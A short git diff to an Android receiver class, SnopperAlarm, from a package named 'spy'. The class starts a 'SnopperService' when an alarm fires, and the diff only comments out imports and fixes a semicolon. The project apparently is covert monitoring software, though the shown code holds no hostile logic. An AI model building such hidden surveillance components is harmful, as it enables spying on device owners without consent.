@@ -4,16 +4,16 @@ import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
 import android.os.PowerManager;
-import android.widget.Toast;
+// import android.widget.Toast;
 import com.gameofcoding.spy.services.SnopperService;
 import com.gameofcoding.spy.utils.XLog;
-import java.text.Format;
-import java.text.SimpleDateFormat;
-import java.util.Date;
+// import java.text.Format;
+// import java.text.SimpleDateFormat;
+// import java.util.Date;
 
 public class SnopperAlarm extends BroadcastReceiver {
     private static final String TAG = "SnopperAlarm";
-    private static final String SNOPPER_ALARM_TAG = "Snopper Alarm"
+    private static final String SNOPPER_ALARM_TAG = "Snopper Alarm";
     @Override
     public void onReceive(Context context, Intent intent) {
 	XLog.i(TAG, "Snopping alarm received, starting SnopperService.");
